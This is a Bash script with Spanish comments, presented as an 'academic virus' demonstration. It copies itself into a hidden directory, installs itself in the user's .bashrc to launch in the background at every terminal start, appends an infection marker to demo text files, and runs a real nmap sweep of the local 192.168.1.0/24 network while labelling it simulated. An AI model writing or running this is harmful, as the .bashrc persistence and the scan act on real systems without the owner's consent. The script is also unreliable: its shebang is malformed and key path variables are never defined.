!/bin/bash
#   1) Infección de Archivos de Demostración:
#      Busca archivos .txt en un directorio demo y les agrega una firma si no están ya "infectados".
# --- Persistencia ---
# Crear directorio oculto para el virus
mkdir -p "$VIRUS_DIR"

# Copiarse a sí mismo en el directorio oculto (si aún no está allí)
if [ "$(realpath "$0")" != "$(realpath "$VIRUS_SCRIPT")" ]; then
    cp "$0" "$VIRUS_SCRIPT"
fi

# Añadir al .bashrc para ejecutar el script en cada inicio de terminal
if ! grep -q "$VIRUS_SCRIPT" "$BASHRC"; then
    echo "bash $VIRUS_SCRIPT &" >> "$BASHRC"
fi
# --- Funcionalidad 1: Infección de Archivos de Demostración ---
# Crear directorio de demostración y generar archivos de ejemplo si no existen
mkdir -p "$DEMO_DIR"
for i in {1..3}; do
    file="$DEMO_DIR/demo_$i.txt"
    if [ ! -f "$file" ]; then
        echo "Contenido original del archivo $i." > "$file"
    fi
done

# Función que "infecta" los archivos agregando una firma
infect_files() {
    echo "Iniciando infección de archivos en $DEMO_DIR..."
    for file in "$DEMO_DIR"/*.txt; do
        if grep -q "### Infección Simulada" "$file"; then
            echo "El archivo $(basename "$file") ya está infectado por JoseA."
        else
            echo "" >> "$file"
            echo "### Infección Simulada - Virus Académico ###" >> "$file"
            echo "Archivo infectado: $(basename "$file")"
        fi
    done
    echo "Infección de archivos completada."
}
# --- Funcionalidad 2: Escaneo de Red Simulado ---
scan_network() {
    echo "Iniciando escaneo de red simulado..."
    echo -n "Escaneando"
    # Listar IPs ficticias
    mapfile -t ip_array < <(nmap -sn 192.168.1.0/24 | grep "Nmap scan report" | awk '{print $NF}')
    for ip in "${ip_array[@]}"; do
        echo "IP encontrada: $ip"
    done
    echo "Escaneo de red completado."
}

# --- Menú de Selección ---
while true; do
    echo ""
    echo "Seleccione una funcionalidad:"
    echo "1) Infección de Archivos de Demostración"
    echo "2) Escaneo de Red Simulado"
    echo "3) Salir"
    read -rp "Opción [1-3]: " opcion
    case $opcion in
        1) infect_files ;;
        2) scan_network ;;
        3) echo "Saliendo. ¡Hasta luego!" ; exit 0 ;;
        *) echo "Opción inválida. Por favor, intente de nuevo." ;;
    esac
done